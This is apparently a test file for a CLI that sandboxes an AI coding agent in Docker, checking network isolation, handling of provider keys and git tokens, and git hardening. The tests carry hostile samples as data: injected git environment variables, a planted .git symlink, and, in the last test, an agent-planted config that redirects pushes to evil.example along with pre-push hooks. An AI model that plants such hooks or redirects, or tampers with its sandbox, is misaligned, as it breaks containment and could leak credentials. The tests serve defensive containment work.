	// The proxy never joins the default bridge, where unrelated containers could reach it.
	assert.equal(proxy.includes("bridge"), false);
	assert.deepEqual(cleanupArgs(names), [["rm", "--force", names.runner], ["rm", "--force", names.proxy],
		["network", "rm", names.network], ["network", "rm", names.egress]]);
});

test("the runner container gets the internal network, the proxy, and no secret in argv", () => {
	const names = sandboxNames("job_7Q2K");
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: "/tmp/acquit-run-work", argv: agentArgv("claude-code", "Fix the rounding.", null), commandPath: null,
		runner: "claude-code", provider: "anthropic", providerKey: keyCanary, providerModel: null,
		instruction: "Fix the rounding.", jobId: "job_7Q2K", uid: 1002, gid: 1002 };
	const args = runnerRunArgs(plan);
	const proxy = `http://${names.proxy}:8888`;
	for (const name of ["HTTP_PROXY", "HTTPS_PROXY", "http_proxy", "https_proxy"]) assert.equal(args.includes(`${name}=${proxy}`), true, name);
	assert.equal(args.includes("NODE_USE_ENV_PROXY=1"), true);
	// The agent talks to its provider through the proxy and calls nothing else home, whatever the
	// provider is.
	assert.equal(args.includes("CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1"), true);
	assert.equal(args.includes(names.network), true);
	assert.equal(args[args.indexOf("--network") + 1], names.network);
	assert.equal(args.includes("type=bind,source=/tmp/acquit-run-work,target=/work"), true);
	// The work tree is mounted, and an empty read-only tmpfs covers /work/.git: the agent never sees
	// the job's git directory even if something leaves a .git inside the work tree. The mode is
	// named because Docker would copy the host shadow's 0700, which the container's user cannot read.
	const shadow = args.indexOf("--tmpfs");
	assert.equal(shadow > args.indexOf("--mount"), true, "the shadow must be mounted after the work tree");
	assert.equal(args[shadow + 1], "/work/.git:ro,mode=0555");
	assert.deepEqual(args.slice(args.indexOf("--exec")), ["--exec", "claude", "--print", "--dangerously-skip-permissions", "Fix the rounding."]);
	// The key is named, never valued, and never written to a file the container reads.
	assert.equal(args[args.indexOf("ANTHROPIC_API_KEY") - 1], "-e");
	assert.equal(args.includes("--env-file"), false);
	assert.equal(args.some(arg => arg.includes(keyCanary)), false);
	assert.equal(args.some(arg => arg.includes(tokenCanary)), false);
});

test("an openrouter runner gets its key variable by name and the provider's fixed environment", () => {
	const names = sandboxNames("job_7Q2K");
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: "/tmp/acquit-run-work", argv: agentArgv("claude-code", "Fix the rounding.", null), commandPath: null,
		runner: "claude-code", provider: "openrouter", providerKey: keyCanary, providerModel: null,
		instruction: "Fix the rounding.", jobId: "job_7Q2K", uid: null, gid: null };
	const args = runnerRunArgs(plan);
	// The key variable is named with no value; the fixed environment is non-secret by construction.
	assert.equal(args[args.indexOf("ANTHROPIC_AUTH_TOKEN") - 1], "-e");
	assert.equal(args.includes(`ANTHROPIC_AUTH_TOKEN=${keyCanary}`), false);
	assert.equal(args.includes("ANTHROPIC_API_KEY="), true);
	for (const [name, value] of Object.entries(PROVIDER_SPECS.openrouter.fixedEnv(null))) assert.equal(args.includes(`${name}=${value}`), true, name);
	assert.equal(args.includes("ANTHROPIC_BASE_URL=https://openrouter.ai/api"), true);
	assert.equal(args.includes("CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1"), true);
	assert.equal(args.some(arg => arg.includes(keyCanary)), false);
	// A stored model pins every Claude Code model variable the provider spec names.
	const pinned = runnerRunArgs({ ...plan, providerModel: "deepseek/deepseek-v4.1-flash" });
	for (const name of ["ANTHROPIC_MODEL", "ANTHROPIC_DEFAULT_OPUS_MODEL", "ANTHROPIC_DEFAULT_SONNET_MODEL",
		"ANTHROPIC_DEFAULT_HAIKU_MODEL", "CLAUDE_CODE_SUBAGENT_MODEL"]) {
		assert.equal(pinned.includes(`${name}=deepseek/deepseek-v4.1-flash`), true, name);
	}
});

test("the command runner mounts its script read-only, runs it with sh, and names no provider key", () => {
	const names = sandboxNames("job_7Q2K");
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: "/tmp/acquit-run-work", argv: agentArgv("command", "ignored", "/acquit/command.sh"), commandPath: "/tmp/fix.sh",
		runner: "command", provider: "anthropic", providerKey: null, providerModel: null,
		instruction: null, jobId: "job_7Q2K", uid: null, gid: null };
	const args = runnerRunArgs(plan);
	assert.equal(args.includes("--env-file"), false);
	assert.equal(args.includes("ANTHROPIC_API_KEY"), false);
	assert.equal(args.includes("CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC=1"), false);
	assert.equal(args.includes("type=bind,source=/tmp/fix.sh,target=/acquit/command.sh,readonly"), true);
	assert.deepEqual(args.slice(args.indexOf("--exec")), ["--exec", "/bin/sh", "/acquit/command.sh"]);
});

test("the claude-code command assembly names the model CLI and never the key", () => {
	assert.deepEqual(agentArgv("claude-code", "Fix the rounding in src/money.ts.", null),
		["claude", "--print", "--dangerously-skip-permissions", "Fix the rounding in src/money.ts."]);
	assert.deepEqual(agentArgv("command", "ignored", "/tmp/fix.sh"), ["/bin/sh", "/tmp/fix.sh"]);
});

test("the provider key rides only in the docker child's environment, never argv or a file", async t => {
	const names = sandboxNames("job_7Q2K");
	const docker = fakeDocker();
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: sandboxWorkTree(t), argv: agentArgv("claude-code", "Fix the rounding.", null), commandPath: null,
		runner: "claude-code", provider: "anthropic", providerKey: keyCanary, providerModel: null,
		instruction: "Fix the rounding.", jobId: "job_7Q2K", uid: null, gid: null };
	assert.equal(await runAgentInSandbox(plan, docker), 0);
	const runner = docker.calls.findIndex(args => args[0] === "run" && !args.includes("--detach"));
	assert.equal(runner >= 0, true);
	// The runner call carries the value in its environment; the setup calls around it never see it.
	assert.equal(docker.envs[runner]?.ANTHROPIC_API_KEY, keyCanary);
	for (const [index, env] of docker.envs.entries()) {
		if (index !== runner) assert.equal(env?.ANTHROPIC_API_KEY, undefined, `call ${docker.calls[index].join(" ")}`);
	}
	assert.equal(docker.calls.flat().some(arg => typeof arg === "string" && arg.includes(keyCanary)), false);
});

test("an openrouter sandbox points the proxy at openrouter.ai and puts the key in ANTHROPIC_AUTH_TOKEN", async t => {
	const names = sandboxNames("job_7Q2K");
	const docker = fakeDocker();
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: sandboxWorkTree(t), argv: agentArgv("claude-code", "Fix the rounding.", null), commandPath: null,
		runner: "claude-code", provider: "openrouter", providerKey: keyCanary, providerModel: "deepseek/deepseek-v4.1-flash",
		instruction: "Fix the rounding.", jobId: "job_7Q2K", uid: null, gid: null };
	assert.equal(await runAgentInSandbox(plan, docker), 0);
	const proxy = docker.calls.findIndex(args => args[0] === "run" && args.includes("--detach"));
	assert.equal(proxy >= 0, true);
	assert.equal(docker.calls[proxy].includes("ACQUIT_PROVIDER_HOST=openrouter.ai"), true);
	const runner = docker.calls.findIndex(args => args[0] === "run" && !args.includes("--detach"));
	assert.equal(runner >= 0, true);
	// The key variable the provider table names carries the value; the other provider's variable
	// stays out of every child entirely.
	assert.equal(docker.envs[runner]?.ANTHROPIC_AUTH_TOKEN, keyCanary);
	for (const [index, env] of docker.envs.entries()) {
		assert.equal(env?.ANTHROPIC_AUTH_TOKEN, index === runner ? keyCanary : undefined, `call ${docker.calls[index].join(" ")}`);
		assert.equal(env?.ANTHROPIC_API_KEY, undefined, `call ${docker.calls[index].join(" ")}`);
	}
	assert.equal(docker.calls.flat().some(arg => typeof arg === "string" && arg.includes(keyCanary)), false);
});

test("the askpass script names its own token file and holds no token, and the env carries no token path", () => {
	const dir = mkdtempSync(join(tmpdir(), "acquit-run-askpass-"));
	try {
		const askpass = writeAskpass(dir, tokenCanary);
		assert.equal(statSync(askpass.tokenFile).mode & 0o777, 0o600);
		assert.equal(statSync(askpass.script).mode & 0o777, 0o700);
		assert.equal(readFileSync(askpass.tokenFile, "utf8"), `${tokenCanary}\n`);
		const script = readFileSync(askpass.script, "utf8");
		assert.equal(script.includes(tokenCanary), false);
		assert.equal(script.includes(askpass.tokenFile), true, "the script embeds the token file path, not a variable");
		assert.equal(Object.values(askpass.env).some(value => String(value).includes(tokenCanary)), false);
		assert.equal(askpass.env.GIT_ASKPASS, askpass.script);
		// No secret-bearing variable is in the environment git gets: the script knows its own path.
		assert.deepEqual(Object.keys(askpass.env), ["GIT_ASKPASS"]);
	} finally { rmSync(dir, { recursive: true, force: true }); }
});

test("a signal removes the secret directory before the process exits", () => {
	const removed: string[] = [];
	const exits: number[] = [];
	const stop = secretGuard(() => removed.push("secret"), { exit: code => exits.push(code) });
	try {
		process.emit("SIGTERM");
		assert.deepEqual(removed, ["secret"]);
		assert.deepEqual(exits, [143]);
	} finally { stop(); }
});

test("the sandbox creates its egress network, starts the proxy on it, and removes every object", async t => {
	const docker = fakeDocker();
	const names = sandboxNames("job_7Q2K");
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: sandboxWorkTree(t), argv: agentArgv("command", "ignored", "/acquit/command.sh"), commandPath: "/tmp/fix.sh",
		runner: "command", provider: "anthropic", providerKey: null, providerModel: null, instruction: null, jobId: "job_7Q2K", uid: null, gid: null };
	assert.equal(await runAgentInSandbox(plan, docker), 0);
	const verbs = docker.calls.map(args => args.join(" "));
	assert.deepEqual(verbs, [
		`rm --force ${names.runner}`, `rm --force ${names.proxy}`, `network rm ${names.network}`, `network rm ${names.egress}`,
		`network create --internal ${names.network}`,
		`network create -o com.docker.network.bridge.enable_icc=false ${names.egress}`,
		`run --detach --rm --name ${names.proxy} --network ${names.egress} --pull=never -e ACQUIT_PROVIDER_HOST=api.anthropic.com acquit/runner-node20 node /runner/proxy.mjs`,
		`network connect ${names.network} ${names.proxy}`,
		docker.calls[8].join(" "),
		`rm --force ${names.runner}`, `rm --force ${names.proxy}`, `network rm ${names.network}`, `network rm ${names.egress}`,
	]);
	assert.equal(verbs[8].startsWith(`run --rm --name ${names.runner} `), true);
	// The proxy is never attached to the shared bridge.
	assert.equal(docker.calls.some(args => args.includes("bridge")), false);
});

test("a planted work-tree .git symlink is unlinked before the runner mounts the shadow", async () => {
	const work = mkdtempSync(join(tmpdir(), "acquit-run-shadow-"));
	const outside = mkdtempSync(join(tmpdir(), "acquit-run-shadow-target-"));
	try {
		writeFileSync(join(outside, "canary.txt"), "keep\n");
		symlinkSync(outside, join(work, ".git"));
		const names = sandboxNames("job_7Q2K");
		const docker = fakeDocker({ during: args => {
			// When the runner is started the shadow is already a real empty directory, so the tmpfs
			// is mounted over that directory itself and never through a link to the target.
			assert.deepEqual(args.slice(args.indexOf("--tmpfs"), args.indexOf("--tmpfs") + 2), ["--tmpfs", "/work/.git:ro,mode=0555"]);
			assert.equal(lstatSync(join(work, ".git")).isDirectory(), true);
			assert.deepEqual(readdirSync(join(work, ".git")), []);
		} });
		const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
			dir: work, argv: agentArgv("command", "ignored", "/acquit/command.sh"), commandPath: null,
			runner: "command", provider: "anthropic", providerKey: null, providerModel: null, instruction: null, jobId: "job_7Q2K", uid: null, gid: null };
		assert.equal(await runAgentInSandbox(plan, docker), 0);
		// The link itself is gone; the directory it named is untouched.
		assert.equal(lstatSync(join(work, ".git")).isSymbolicLink(), false);
		assert.equal(lstatSync(join(work, ".git")).isDirectory(), true);
		assert.deepEqual(readdirSync(join(work, ".git")), []);
		assert.equal(statSync(join(work, ".git")).mode & 0o777, 0o700);
		assert.equal(readFileSync(join(outside, "canary.txt"), "utf8"), "keep\n");
	} finally {
		rmSync(work, { recursive: true, force: true });
		rmSync(outside, { recursive: true, force: true });
	}
});

test("a failed runner start still removes the containers and both networks", async t => {
	const names = sandboxNames("job_7Q2K");
	const docker = fakeDocker({ failOn: args => args[0] === "run" && args.includes("--rm") });
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: sandboxWorkTree(t), argv: agentArgv("command", "ignored", "/acquit/command.sh"), commandPath: "/tmp/fix.sh",
		runner: "command", provider: "anthropic", providerKey: null, providerModel: null, instruction: null, jobId: "job_7Q2K", uid: null, gid: null };
	await assert.rejects(runAgentInSandbox(plan, docker), (error: CliError) => error.code === "DOCKER_UNAVAILABLE");
	const verbs = docker.calls.map(args => args.join(" "));
	assert.equal(verbs.at(-4), `rm --force ${names.runner}`);
	assert.equal(verbs.at(-3), `rm --force ${names.proxy}`);
	assert.equal(verbs.at(-2), `network rm ${names.network}`);
	assert.equal(verbs.at(-1), `network rm ${names.egress}`);
});

test("a failed sandbox setup refuses by name, bounds the docker output, and still cleans up", async t => {
	const names = sandboxNames("job_7Q2K");
	const docker = fakeDocker({ codeOn: args => args[0] === "network" && args[1] === "create" ? 125 : undefined,
		output: `Error response from daemon: pull access denied for ${tokenCanary}@example.invalid/runner\n`.repeat(20) });
	const plan: RunnerPlan = { names, image: "acquit/runner-node20", proxyImage: "acquit/runner-node20",
		dir: sandboxWorkTree(t), argv: agentArgv("command", "ignored", "/acquit/command.sh"), commandPath: "/tmp/fix.sh",
		runner: "command", provider: "anthropic", providerKey: null, providerModel: null, instruction: null, jobId: "job_7Q2K", uid: null, gid: null };
	await assert.rejects(runAgentInSandbox(plan, docker), (error: CliError) => error.code === "SANDBOX_SETUP_FAILED"
		&& error.message.includes("125") && error.message.length < 500 && !error.message.includes("\n")
		&& !error.message.includes(tokenCanary));
	const verbs = docker.calls.map(args => args.join(" "));
	assert.equal(verbs.at(-4), `rm --force ${names.runner}`);
	assert.equal(verbs.at(-1), `network rm ${names.egress}`);
});

test("the signal guard removes the secret directory and the sandbox before it exits", () => {
	const names = sandboxNames("job_7Q2K");
	const secret = makeSecretDir();
	writeFileSync(join(secret.path, "token"), "not a real token\n");
	const cleaned: SandboxNames[] = [];
	const exits: number[] = [];
	const stop = signalGuard(names, { cleanup: value => cleaned.push(value), exit: code => exits.push(code),
		onSignal: () => secret.remove() });
	try {
		process.emit("SIGINT");
		assert.equal(existsSync(secret.path), false);
		assert.deepEqual(cleaned, [names]);
		assert.deepEqual(exits, [130]);
	} finally {
		stop();
		secret.remove();
	}
});

// ---- the whole command ------------------------------------------------------------------------

test("run prints the tutorial's lines, keeps both secrets out of argv and the log, and cleans up", async () => {
	const work = mkdtempSync(join(tmpdir(), "acquit-run-flow-"));
	const stateHome = mkdtempSync(join(tmpdir(), "acquit-run-flow-state-"));
	try {
		const git = fakeGit({ numstat: "1\t0\ttests/totals.test.ts\0", head: "c".repeat(40) });
		const docker = fakeDocker();
		const printed: string[] = [];
		const client = fakeClient();
		const times = [0, 308_000];
		let tokenFileSeen: string | null = null;
		let tokenFileMode = 0;
		let askpassScript: string | null = null;
		const gitPort: GitRun = (args, env) => {
			if (args.includes("clone") && env?.GIT_ASKPASS !== undefined) {
				askpassScript = readFileSync(env.GIT_ASKPASS, "utf8");
				const tokenFile = /cat '([^']*)'/.exec(askpassScript)?.[1] ?? "";
				tokenFileSeen = readFileSync(tokenFile, "utf8").trim();
				tokenFileMode = statSync(tokenFile).mode & 0o777;
			}
			return git(args, env);
		};
		await runRun(runOptions({ dir: work }), { client, provider: keyPort(keyCanary), docker, git: gitPort,
			print: line => printed.push(line), now: () => times.shift() ?? 308_000,
			env: { PATH: process.env.PATH, XDG_STATE_HOME: stateHome, ACQUIT_TOKEN: "session-canary", ACQUIT_PROVIDER_KEY: keyCanary,
				// Every one of these must be gone from the git child's environment.
				ACQUIT_RUN_TOKEN_FILE: "/tmp/inherited-token-file", GIT_DIR: "/tmp/evil", GIT_WORK_TREE: "/tmp/evil",
				GIT_CONFIG_COUNT: "1", GIT_CONFIG_KEY_0: "core.hooksPath", GIT_CONFIG_VALUE_0: "/tmp/evil-hooks",
				GIT_SSH_COMMAND: "evil", SSH_ASKPASS: "/tmp/evil-askpass" } });
		assert.equal(printed.join("\n"), [
			"Preparing sandbox for job_7Q2K",
			"\tFork: acquit-forks/invoice-app-7q2k (scoped token, expires with the job)",
			"\tContainer: acquit/runner-node20 (network: package registry and your model provider only)",
			"Running ts-bugfixer with your Anthropic key",
			"Agent finished in 5m 08s",
			"\tChanged files: tests/totals.test.ts (1 line)",
			"\tReview the diff: acquit diff job_7Q2K",
		].join("\n"));
		assert.deepEqual(client.posts, ["/api/jobs/job_7Q2K/work-repo-token"]);
		assert.equal(tokenFileSeen, tokenCanary);
		assert.equal(tokenFileMode, 0o600);
		// The askpass script names its own token file; the path is not a variable in git's environment.
		assert.equal(askpassScript !== null && (askpassScript as string).includes(tokenFileSeen ?? ""), false);
		const stateDir = stateGitDir("job_7Q2K", { XDG_STATE_HOME: stateHome });
		const gitLines = git.calls.map(call => call.args.join(" "));
		assert.equal(gitLines.some(line => line.includes("clone") && line.includes(`--separate-git-dir ${stateDir}`)), true, gitLines.join(" | "));
		assert.equal(gitLines.some(line => line.includes(`--git-dir ${stateDir}`) && line.includes(`--work-tree ${work}`)
			&& line.includes("core.hooksPath=")), true, gitLines.join(" | "));
		assert.equal(gitLines.some(line => line.includes("push") && line.includes("refs/heads/submissions/")), true, gitLines.join(" | "));
		// What is counted is the commit that was pushed, not the working tree that was left behind.
		const head = "c".repeat(40);
		assert.equal(gitLines.some(line => line.includes("diff --numstat") && line.includes(head)), true, gitLines.join(" | "));
		// Neither secret rides in a git child's environment, and no inherited git variable survives.
		for (const call of git.calls) {
			// The two global-identity reads keep the operator's home so their config is found; every
			// other call reads the CLI's own empty global config.
			const identityRead = call.args[0] === "config" && call.args[1] === "--global";
			assert.equal(call.env?.ACQUIT_TOKEN, undefined);
			assert.equal(call.env?.ACQUIT_PROVIDER_KEY, undefined);
			assert.equal(call.env?.ANTHROPIC_API_KEY, undefined);
			assert.equal(call.env?.ACQUIT_RUN_TOKEN_FILE, undefined);
			assert.equal(call.env?.GIT_DIR, undefined);
			assert.equal(call.env?.GIT_WORK_TREE, undefined);
			assert.equal(call.env?.GIT_CONFIG_COUNT, undefined);
			assert.equal(call.env?.GIT_CONFIG_KEY_0, undefined);
			assert.equal(call.env?.GIT_CONFIG_VALUE_0, undefined);
			assert.equal(call.env?.GIT_SSH_COMMAND, undefined);
			assert.equal(call.env?.SSH_ASKPASS, undefined);
			assert.equal(call.env?.GIT_CONFIG_NOSYSTEM, identityRead ? undefined : "1");
			assert.equal(call.env?.GIT_CONFIG_GLOBAL, identityRead ? undefined : join(stateHome, "acquit", "gitconfig"));
			// The askpass rides only on a command that can reach a remote: a local call runs on the
			// hardened env alone.
			const remoteCall = call.args.includes("clone") || call.args.includes("fetch") || call.args.includes("push");
			assert.equal(call.env?.GIT_ASKPASS !== undefined, remoteCall, call.args.join(" "));
		}
		const runnerCall = docker.calls.findIndex(args => args[0] === "run" && !args.includes("--detach"));
		assert.equal(runnerCall >= 0, true);
		for (const [index, childEnv] of docker.envs.entries()) {
			assert.equal(childEnv?.ACQUIT_TOKEN, undefined);
			assert.equal(childEnv?.ACQUIT_PROVIDER_KEY, undefined);
			assert.equal(childEnv?.ANTHROPIC_API_KEY, index === runnerCall ? keyCanary : undefined, docker.calls[index].join(" "));
		}
		const dockerLines = docker.calls.map(args => args.join(" "));
		assert.equal(dockerLines.some(line => line.includes(tokenCanary) || line.includes(keyCanary)), false);
		assert.equal(dockerLines.some(line => line.includes("--env-file")), false);
		assert.equal(dockerLines.some(line => line.includes(`--name acquit-runner-job_7Q2K`)), true);
		assert.equal(dockerLines.at(-1), "network rm acquit-runner-job_7Q2K-egress");
		assert.equal(printed.join("\n").includes(tokenCanary) || printed.join("\n").includes(keyCanary), false);
	} finally {
		rmSync(work, { recursive: true, force: true });
		rmSync(stateHome, { recursive: true, force: true });
	}
});

test("in a full run, only clone, fetch, and push carry the askpass, each after the scan of its location", async () => {
	const work = mkdtempSync(join(tmpdir(), "acquit-run-askpass-flow-"));
	const stateHome = mkdtempSync(join(tmpdir(), "acquit-run-askpass-state-"));
	try {
		const git = fakeGit({ numstat: "", head: "c".repeat(40), origin: "https://github.com/acquit-forks/invoice-app-7q2k.git" });
		const env = { PATH: process.env.PATH, XDG_STATE_HOME: stateHome };
		const deps = { client: fakeClient(), provider: keyPort(keyCanary), docker: fakeDocker(), git, print: () => {}, now: () => 0, env };
		const kindOf = (args: readonly string[]): string => args.includes("clone") ? "clone"
			: args.includes("fetch") ? "fetch" : args.includes("push") ? "push" : "local";
		// The destination a token call names: the clone's URL argument, or the first non-option word
		// after fetch/push. The assertions below require it to be the CLI-minted URL, so a token call
		// that names a remote (`origin`) or any other word instead fails this test.
		const destinationOf = (args: readonly string[]): string | null => {
			const at = args.findIndex(arg => arg === "clone" || arg === "fetch" || arg === "push");
			if (at === -1) return null;
			if (args[at] === "clone") return args.at(-2) ?? null;
			for (let index = at + 1; index < args.length; index++) if (!args[index].startsWith("-")) return args[index];
			return null;
		};
		const minted = workRepoUrl(workRepo);
		const runs: (typeof git.calls)[] = [];
		// A fresh run clones: the one token call with no git directory to scan yet.
		let mark = git.calls.length;
		await runRun(runOptions({ dir: work }), deps);
		runs.push(git.calls.slice(mark));
		// A rerun's first token call is the fetch of the state checkout, which has a directory to scan.
		mark = git.calls.length;
		await runRun(runOptions({ dir: work }), deps);
		runs.push(git.calls.slice(mark));
		const state = stateGitDir("job_7Q2K", env);
		for (const [index, calls] of runs.entries()) {
			// A local-only command never carries the CLI's askpass.
			assert.deepEqual(calls.filter(call => call.env?.GIT_ASKPASS !== undefined).map(call => kindOf(call.args)),
				index === 0 ? ["clone", "push"] : ["fetch", "push"]);
			for (const [at, call] of calls.entries()) {
				if (call.env?.GIT_ASKPASS === undefined || kindOf(call.args) === "clone") continue;
				// Every token call but the fresh clone is preceded, in this same run, by the scan of
				// the location that call names.
				const gitDir = call.args[call.args.indexOf("--git-dir") + 1];
				const workTree = call.args[call.args.indexOf("--work-tree") + 1];
				const scanned = calls.slice(0, at).some(earlier => {
					const text = earlier.args.join(" ");
					return text.includes("config --list --show-scope") && text.includes(`--git-dir ${gitDir}`) && text.includes(`--work-tree ${workTree}`);
				});
				assert.equal(scanned, true, `no scan before ${call.args.join(" ")}`);
			}
			// Every token call names the exact work-repo URL the CLI minted, never a remote name git
			// resolves from config, so no key in a scanned checkout can steer the token.
			for (const call of calls.filter(call => call.env?.GIT_ASKPASS !== undefined)) {
				assert.equal(destinationOf(call.args), minted, `a token call named a remote: ${call.args.join(" ")}`);
				// No token call can recurse into a submodule: the guard config is on every one, and the
				// fetch names the flag that outranks a planted .gitmodules.
				for (const key of ["submodule.recurse=false", "fetch.recurseSubmodules=false", "push.recurseSubmodules=no"]) {
					assert.ok(call.args.includes(key), `token call without ${key}: ${call.args.join(" ")}`);
				}
				// The minted URL is https, so the token call settles the transport as https only.
				assert.ok(call.args.includes("protocol.allow=never") && call.args.includes("protocol.https.allow=always"),
					`token call without the https-only transport: ${call.args.join(" ")}`);
			}
			const fetch = calls.find(call => kindOf(call.args) === "fetch");
			if (fetch !== undefined) assert.ok(fetch.args.includes("--no-recurse-submodules"), fetch.args.join(" "));
			const clone = calls.find(call => kindOf(call.args) === "clone");
			if (clone !== undefined) {
				// The exempt clone is the fresh one only: a new CLI-created git directory and no template.
				assert.equal(clone.args.join(" ").includes(`--separate-git-dir ${state}`), true, clone.args.join(" "));
				assert.equal(clone.args.includes("--template="), true, clone.args.join(" "));
			}
		}
	} finally {
		rmSync(work, { recursive: true, force: true });
		rmSync(stateHome, { recursive: true, force: true });
	}
});

test("an openrouter run names the model and gives the proxy and the runner the openrouter provider", async () => {
	const work = mkdtempSync(join(tmpdir(), "acquit-run-openrouter-"));
	const stateHome = mkdtempSync(join(tmpdir(), "acquit-run-openrouter-state-"));
	try {
		const git = fakeGit({ numstat: "", head: "c".repeat(40) });
		const docker = fakeDocker();
		const printed: string[] = [];
		await runRun(runOptions({ dir: work }), { client: fakeClient(),
			provider: keyPort(keyCanary, "openrouter", "deepseek/deepseek-v4.1-flash"), docker, git,
			print: line => printed.push(line), now: () => 0, env: { PATH: process.env.PATH, XDG_STATE_HOME: stateHome } });
		assert.equal(printed.includes("Running ts-bugfixer with your OpenRouter key, model deepseek/deepseek-v4.1-flash"), true, printed.join("\n"));
		// The proxy is told the provider host the provider table names, and the runner gets the
		// provider's own key variable by name.
		const proxy = docker.calls.findIndex(args => args[0] === "run" && args.includes("--detach"));
		assert.equal(proxy >= 0, true);
		assert.equal(docker.calls[proxy].includes("ACQUIT_PROVIDER_HOST=openrouter.ai"), true, docker.calls[proxy].join(" "));
		const runner = docker.calls.findIndex(args => args[0] === "run" && !args.includes("--detach"));
		assert.equal(runner >= 0, true);
		assert.equal(docker.envs[runner]?.ANTHROPIC_AUTH_TOKEN, keyCanary);
		for (const [index, env] of docker.envs.entries()) assert.equal(env?.ANTHROPIC_API_KEY, undefined, docker.calls[index].join(" "));
		assert.equal(printed.join("\n").includes(keyCanary), false);
		assert.equal(docker.calls.flat().some(arg => typeof arg === "string" && arg.includes(keyCanary)), false);
	} finally {
		rmSync(work, { recursive: true, force: true });
		rmSync(stateHome, { recursive: true, force: true });
	}
});

test("the submission folds uncommitted work onto the agent's own commit", () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-submission-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const state = stateGitDir("job_7Q2K", { XDG_STATE_HOME: join(root, "state-home") });
		const work = join(root, "work");
		const checkout = { gitDir: state, workTree: work };
		prepareWorkRepo(git, checkout, bare, frozen, process.env);
		// The agent commits one file and leaves another uncommitted: both must reach the pushed commit.
		writeFileSync(join(work, "a.ts"), "export const a = 2;\n");
		assert.equal(git(["--git-dir", state, "--work-tree", work, "add", "-A"]).status, 0);
		assert.equal(git(["--git-dir", state, "--work-tree", work, "-c", "user.name=agent", "-c", "user.email=agent@example.invalid",
			"commit", "--quiet", "-m", "agent"]).status, 0);
		writeFileSync(join(work, "b.ts"), "export const b = 1;\n");
		const pushed = submissionCommit(git, checkout, frozen, "Run job_7Q2K with ts-bugfixer", process.env);
		assert.notEqual(pushed, null);
		assert.notEqual(pushed, frozen);
		// The pushed commit's tree carries both the agent's own commit and the file it left uncommitted.
		assert.deepEqual(git(["--git-dir", state, "ls-tree", "-r", "--name-only", pushed as string]).stdout.trim().split("\n").sort(),
			["a.ts", "b.ts", "money.ts"]);
		assert.deepEqual(changedFiles(git, checkout, frozen, process.env, pushed as string), [
			{ path: "a.ts", added: 1, binary: false },
			{ path: "b.ts", added: 1, binary: false },
		]);
		assert.equal(git(["--git-dir", state, "--work-tree", work, "status", "--porcelain"]).stdout.trim(), "");
		// Nothing changed since the fold, so the same commit is what a second run pushes; a checkout
		// left on the frozen commit has nothing to push at all.
		assert.equal(submissionCommit(git, checkout, frozen, "again", process.env), pushed);
		assert.equal(git(["--git-dir", state, "--work-tree", work, "reset", "--hard", "--quiet", frozen]).status, 0);
		assert.equal(submissionCommit(git, checkout, frozen, "again", process.env), null);
	} finally { rmSync(root, { recursive: true, force: true }); }
});

test("a planted work-tree .git and pre-push hook never reach run's push", async () => {
	const root = mkdtempSync(join(tmpdir(), "acquit-run-isolation-"));
	try {
		const { bare, frozen, git } = workRepoFixture(root);
		const stateHome = join(root, "state-home");
		const stateDir = stateGitDir("job_7Q2K", { XDG_STATE_HOME: stateHome });
		const work = join(root, "work");
		const github = "https://github.com/acquit-forks/invoice-app-7q2k.git";
		const canary = join(root, "hook-ran");
		const command = join(root, "fix.sh");
		writeFileSync(command, "#!/bin/sh\nexit 0\n", { mode: 0o755 });
		const calls: { readonly args: readonly string[]; readonly env: NodeJS.ProcessEnv | undefined }[] = [];
		// The child git is real; only the work-repo URL the API names is redirected to the local bare
		// repo. The https-only transport guard the CLI adds for that URL follows the redirect to the
		// transport the stand-in uses, and the clone's origin is re-written to the URL the real clone
		// would have written, which is the one the scan judges the checkout against.
		const gitPort: GitRun = (args, env) => {
			calls.push({ args: [...args], env });
			const result = git(args.map(arg => arg === github ? bare
				: arg === "protocol.https.allow=always" ? "protocol.file.allow=always" : arg), env);
			const at = args.indexOf("--separate-git-dir");
			if (at !== -1 && result.status === 0) git(["--git-dir", args[at + 1], "config", "--local", "remote.origin.url", github], env);
			return result;
		};
		// The "agent" writes the fix, then plants git metadata in the work tree and a hook in the state
		// gitdir. None of it may reach the host's commit or push.
		const docker = fakeDocker({ during: () => {
			writeFileSync(join(work, "src.ts"), "export const fixed = true;\n");
			mkdirSync(join(work, ".git", "hooks"), { recursive: true });
			writeFileSync(join(work, ".git", "config"), `[url "https://evil.example/"]\n\tinsteadOf = ${bare}\n[core]\n\tsshCommand = /bin/false\n`);
			writeFileSync(join(work, ".git", "hooks", "pre-push"), `#!/bin/sh\ntouch ${canary}\n`, { mode: 0o755 });
			mkdirSync(join(stateDir, "hooks"), { recursive: true });
			writeFileSync(join(stateDir, "hooks", "pre-push"), `#!/bin/sh\ntouch ${canary}\n`, { mode: 0o755 });
		} });
		const printed: string[] = [];
		// The contract's frozen commit is the fixture's, so the clone and checkout are the same history.
		const job = jobView({ contract: { repository: "maya-client/invoice-app", frozenAt: frozen, frozenTests: 48, hiddenTests: 6, protectedPaths: [] } });
		await runRun(runOptions({ dir: work, runner: "command", command }), { client: fakeClient({ job }), provider: keyPort(null),
			docker, git: gitPort, print: line => printed.push(line), now: () => 0,
			env: { PATH: process.env.PATH, XDG_STATE_HOME: stateHome } });
		const head = git(["--git-dir", stateDir, "rev-parse", "HEAD"]).stdout.trim();
		// The commit landed in the real remote under the submission ref, and no hook ran anywhere.
		assert.equal(spawnSync("git", ["--git-dir", bare, "rev-parse", `refs/heads/submissions/${head}`]).status, 0, printed.join("\n"));
		assert.equal(existsSync(canary), false);
